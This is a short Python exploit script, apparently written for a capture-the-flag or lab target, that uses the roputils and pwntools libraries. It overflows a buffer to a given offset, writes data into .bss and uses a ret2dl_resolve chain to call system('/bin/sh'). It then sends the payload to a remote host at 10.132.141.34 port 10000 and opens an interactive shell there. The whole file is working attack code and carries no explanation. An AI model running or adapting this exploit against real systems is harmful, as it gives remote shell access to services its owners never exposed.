from roputils import *
from pwn import remote
#from pwn import gdb
#from pwn import context

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_bss = rop.section('.bss')

buf = rop.retfill(offset)
buf += rop.call('read', 0, addr_bss, 100)
buf += rop.dl_resolve_call(addr_bss+20, addr_bss)

r = remote("10.132.141.34", 10000)
r.sendline(buf)
#p = Proc(rop.fpath)
#p.write(p32(len(buf)) + buf)
#print "[+] read: %r" % p.read(len(buf))

buf = rop.string('/bin/sh')
buf += rop.fill(20, buf)
buf += rop.dl_resolve_data(addr_bss+20, 'system')
buf += rop.fill(100, buf)

#p.write(buf)
#p.interact(0)
r.send(buf)
r.interactive()
